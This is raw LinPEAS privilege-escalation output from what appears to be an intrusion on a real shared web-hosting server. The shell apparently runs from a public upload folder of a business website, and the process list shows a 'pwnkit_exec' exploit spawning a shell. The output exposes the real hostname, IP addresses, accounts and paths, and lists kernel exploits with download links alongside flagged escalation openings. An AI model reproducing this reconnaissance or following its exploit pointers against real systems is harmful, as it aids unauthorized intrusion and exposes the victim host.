/---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.18.0-513.11.1.lve.el8.x86_64 (mockbuild@buildfarm01-new.corp.cloudlinux.com) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-20) (GCC)) #1 SMP Thu Jan 18 16:21:02 UTC 2024
User & Groups: uid=311353020(u311353020) gid=1050030915(o50030915) groups=1050030915(o50030915)
Hostname: sg-nme-web1099.main-hosting.eu

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 4.18.0-513.11.1.lve.el8.x86_64 (mockbuild@buildfarm01-new.corp.cloudlinux.com) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-20) (GCC)) #1 SMP Thu Jan 18 16:21:02 UTC 2024
lsb_release Not Found

╔══════════╣ Sudo version
sudo Not Found


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/bin:/usr/bin

╔══════════╣ Date & uptime
Mon Apr 21 00:24:16 UTC 2025
 00:24:16 up 237 days, 17:51,  0 users,  load average: 13.08, 14.77, 14.18

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Environment
╚ Any private information inside environment variables?
PWD=/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2
LC_CTYPE=C.UTF-8
SHLVL=3
PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
_=/usr/bin/env

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
main: line 1920: rpm: command not found
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.


╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... No

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
./linpeas.sh: line 2082: mount: command not found
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
Learn and practice cloud hacking techniques in training.hacktricks.xyz

═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
u311353+  891505  0.0  0.0  11928  2892 ?        S    00:18   0:00 sh -c /bin/sh -c "cd "/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2";./run_all.sh;echo 4728cf1254;pwd;echo b396d3" 2>&1
u311353+  891507  0.0  0.0  11928  2748 ?        S    00:18   0:00  _ /bin/sh -c cd /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2;./run_all.sh;echo 4728cf1254;pwd;echo b396d3
u311353+  891512  0.0  0.0  11928  2744 ?        S    00:18   0:00      _ /bin/bash ./run_all.sh
u311353+  891515  0.0  0.0   4240  1292 ?        S    00:18   0:00          _ ./pwnkit_exec
u311353+  891517  0.0  0.0  11928  2920 ?        S    00:18   0:00              _ /bin/sh
u311353+  933560  0.0  0.0 225116  3588 pts/0    Ss   00:19   0:00                      _ /usr/bin/bash
u311353+ 1378156  0.4  0.0 227284  5492 pts/0    S+   00:23   0:00                          _ /bin/sh ./linpeas.sh
u311353+ 1419232  0.0  0.0 227284  4120 pts/0    S+   00:24   0:00                              _ /bin/sh ./linpeas.sh
u311353+ 1419235  0.0  0.0 257764  3688 pts/0    R+   00:24   0:00                              |   _ ps fauxwww
u311353+ 1419236  0.0  0.0 227284  2648 pts/0    S+   00:24   0:00                              _ /bin/sh ./linpeas.sh
u311353+   78095  0.0  0.0   7648  2840 ?        S    Apr20   0:00 unzip memexec_elf_executable.zip
u311353+  767859  0.0  0.0 513076 52576 ?        S    Apr11   0:50 lsphp


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 78095 with ppid 1 is run by user u311353020 but the ppid user is 
Proc 767859 with ppid 1 is run by user u311353020 but the ppid user is 
Proc 891505 with ppid 1 is run by user u311353020 but the ppid user is 

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
crontab Not Found
incrontab Not Found

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
/home/u311353020/domains/grupors.com.mx/public_html/ventas/cron/MailScanner.service
/home/u311353020/domains/grupors.com.mx/public_html/ventas/cron/SendReminder.service
/home/u311353020/domains/grupors.com.mx/public_html/ventas/cron/modules/Import/ScheduledImport.service
/home/u311353020/domains/grupors.com.mx/public_html/ventas/cron/modules/Reports/ScheduleReports.service
/home/u311353020/domains/grupors.com.mx/public_html/ventas/cron/modules/SalesOrder/RecurringInvoice.service
/home/u311353020/domains/grupors.com.mx/public_html/ventas/cron/modules/com_vtiger_workflow/com_vtiger_workflow.service
/home/u311353020/domains/grupors.com.mx/public_html/ventas/pkg/vtiger/modules/Import/cron/ScheduledImport.service
/lib/systemd/system/db_governor.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
sed: -e expression #1, char 0: no previous regular expression
/opt/alt/clos_ssa/run/ssa.sock
  └─(Read Write)
/opt/alt/php-xray/run/xray-user.sock
  └─(Read Write)
/opt/alt/php-xray/run/xray.sock
  └─(Read Write)
/run/systemd/journal/dev-log.cagefs/dev-log
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
busctl Not Found
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.103/32 brd 185.232.14.103 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.104/32 brd 185.232.14.104 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.105/32 brd 185.232.14.105 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.106/32 brd 185.232.14.106 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.107/32 brd 185.232.14.107 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.108/32 brd 185.232.14.108 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.109/32 brd 185.232.14.109 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.110/32 brd 185.232.14.110 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.111/32 brd 185.232.14.111 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.112/32 brd 185.232.14.112 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.113/32 brd 185.232.14.113 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.114/32 brd 185.232.14.114 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.115/32 brd 185.232.14.115 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.116/32 brd 185.232.14.116 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.117/32 brd 185.232.14.117 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.118/32 brd 185.232.14.118 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.119/32 brd 185.232.14.119 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.120/32 brd 185.232.14.120 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.121/32 brd 185.232.14.121 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.122/32 brd 185.232.14.122 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.123/32 brd 185.232.14.123 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.124/32 brd 185.232.14.124 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.125/32 brd 185.232.14.125 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.126/32 brd 185.232.14.126 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.127/32 brd 185.232.14.127 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.128/32 brd 185.232.14.128 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.129/32 brd 185.232.14.129 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.130/32 brd 185.232.14.130 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.131/32 brd 185.232.14.131 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.132/32 brd 185.232.14.132 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.133/32 brd 185.232.14.133 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.134/32 brd 185.232.14.134 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.135/32 brd 185.232.14.135 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.136/32 brd 185.232.14.136 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.137/32 brd 185.232.14.137 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.138/32 brd 185.232.14.138 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.139/32 brd 185.232.14.139 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.140/32 brd 185.232.14.140 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.141/32 brd 185.232.14.141 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.142/32 brd 185.232.14.142 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.143/32 brd 185.232.14.143 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.144/32 brd 185.232.14.144 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.145/32 brd 185.232.14.145 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.146/32 brd 185.232.14.146 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.147/32 brd 185.232.14.147 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.148/32 brd 185.232.14.148 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.149/32 brd 185.232.14.149 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.150/32 brd 185.232.14.150 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.151/32 brd 185.232.14.151 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.152/32 brd 185.232.14.152 scope host lo
       valid_lft forever preferred_lft forever
    inet 185.232.14.153/32 brd 185.232.14.153 scope host lo
       valid_lft forever preferred_lft forever
    inet6 2a02:4780:3::11/128 scope global 
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:62:0b:ac:f1:86 brd ff:ff:ff:ff:ff:ff
    altname enp198s0f0np0
    altname ens10f0np0
    inet6 fe80::262:bff:feac:f186/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 00:62:0b:ac:f1:87 brd ff:ff:ff:ff:ff:ff
    altname enp198s0f1np1
    altname ens10f1np1
4: eth0.666@eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:62:0b:ac:f1:86 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::262:bff:feac:f186/64 scope link 
       valid_lft forever preferred_lft forever
5: eth1.666@eth1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state LOWERLAYERDOWN group default qlen 1000
    link/ether 00:62:0b:ac:f1:87 brd ff:ff:ff:ff:ff:ff

╔══════════╣ Hostname, hosts and DNS

127.0.0.1   sg-nme-web1099 sg-nme-web1099.main-hosting.eu localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         sg-nme-web1099 sg-nme-web1099.main-hosting.eu localhost localhost.localdomain localhost6 localhost6.localdomain6
127.0.0.1 mysql
127.0.0.1 mysql.main-hosting.com
127.0.0.1 mysql.hostinger.ru
127.0.0.1 mysql.hostinger.com.ua
127.0.0.1 mysql.idhostinger.com
127.0.0.1 mysql.hostinger.co.id
127.0.0.1 mysql.hostinger.cz
127.0.0.1 mysql.hostinger.com
127.0.0.1 mysql.hostinger.es
127.0.0.1 mysql.hostinger.com.ar
127.0.0.1 mysql.zyro.com
127.0.0.1 mysql.hostinger.mx
127.0.0.1 mysql.hostinger.lt
127.0.0.1 mysql.hostinger.co
127.0.0.1 mysql.hostinger.com.br
127.0.0.1 mysql.hostinger.ro
127.0.0.1 mysql.hostinger.fr
127.0.0.1 mysql.hostinger.it
127.0.0.1 mysql.hostinger.pl
127.0.0.1 mysql.hostinger.ph
127.0.0.1 mysql.hostinger.ae
127.0.0.1 mysql.hostinger.my
127.0.0.1 mysql.hostinger.kr
127.0.0.1 mysql.hostinger.vn
127.0.0.1 mysql.hostinger.in.th
127.0.0.1 mysql.hostinger.web.tr
127.0.0.1 mysql.hostinger.pt
127.0.0.1 mysql.hostinger.de
127.0.0.1 mysql.hostinger.in
127.0.0.1 mysql.hostinger.jp
127.0.0.1 mysql.hostinger.nl
127.0.0.1 mysql.hostinger.co.uk
127.0.0.1 mysql.hostinger.gr
127.0.0.1 mysql.hostinger.hu
127.0.0.1 mysql.hostinger.se
127.0.0.1 mysql.hostinger.dk
127.0.0.1 mysql.hostinger.fi
127.0.0.1 mysql.hostinger.sk
127.0.0.1 mysql.hostinger.no
127.0.0.1 mysql.hostinger.hr
127.0.0.1 mysql.hostinger.si
127.0.0.1 mysql.hostinger.co.il
127.0.0.1 mysql.hostinger.lv
127.0.0.1 mysql.hostinger.ee
127.0.0.1 mysql.spletnahisa.si
127.0.0.1 mysql.hostinger-ar.com
127.0.0.1 mysql.hostinger.com.hk
127.0.0.1 mysql.weblink.com.br
127.0.0.1 mysql.hostmania.es
127.0.0.1 mysql.hosting24.com
127.0.0.1 polyfill.io
127.0.0.1 polyfill.com
127.0.0.1 wp3.xyz

nameserver 127.0.0.1
nameserver 2a02:4780:3:abcd::53
nameserver 217.21.75.1
options timeout 1 attempts 3
dnsdomainname Not Found

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=311353020(u311353020) gid=1050030915(o50030915) groups=1050030915(o50030915)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
ptrace protection is disabled (0), so sudo tokens could be abused

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
apache:x:986:48::/home/apache:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(bin) gid=1(bin) groups=1(bin)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=2(daemon[0m[0m) gid=2(daemon[0m[0m) groups=2(daemon[0m[0m)
uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
uid=3(adm) gid=4(adm) groups=4(adm)
uid=311353020(u311353020) gid=1050030915(o50030915) groups=1050030915(o50030915)
uid=32(rpc) gid=32(rpc) groups=32(rpc)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody),48(apache)
uid=7(halt) gid=0(root) groups=0(root)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=93(exim) gid=93(exim) groups=93(exim),12(mail)
uid=986(apache) gid=48(apache) groups=48(apache)
uid=991(mysql) gid=983(mysql) groups=983(mysql)

╔══════════╣ Login now

╔══════════╣ Last logons

╔══════════╣ Last time logon each user

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/wget

╔══════════╣ Installed Compilers

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found
httpd Not Found

Nginx version: nginx Not Found

══╣ PHP exec extensions


lrwxrwxrwx 1 root root 26 Aug 13  2024 /etc/cl.selector/php.ini -> /opt/alt/php56/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
lrwxrwxrwx 1 root root 24 Mar 26 19:37 /etc/php.ini -> /etc/cl.selector/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 u311353020 o50030915 45 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/ventas/php.ini
-rw-r--r-- 1 u311353020 o50030915 38783 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/ventas/pkg/php/php.ini
allow_call_time_pass_reference = On
allow_url_fopen = On
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
ingres.allow_persistent = On
-rw-r--r-- 1 root 996 45714 Apr 20 19:37 /opt/alt/php52/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 46315 Apr 20 19:37 /opt/alt/php53/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 46687 Apr 20 19:37 /opt/alt/php54/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 46315 Apr 20 19:37 /opt/alt/php55/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 46315 Apr 20 19:37 /opt/alt/php56/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 46315 Apr 20 19:37 /opt/alt/php70/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 46315 Apr 20 19:37 /opt/alt/php71/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 43743 Apr 20 19:37 /opt/alt/php72/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 43714 Apr 20 19:37 /opt/alt/php73/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 43714 Apr 20 19:37 /opt/alt/php74/etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root 996 62125 Apr 20 19:37 /opt/alt/php80/etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root 996 62125 Apr 20 19:37 /opt/alt/php81/etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root 996 62125 Apr 20 19:37 /opt/alt/php82/etc/php.ini
allow_url_fopen = On
allow_url_include = Off
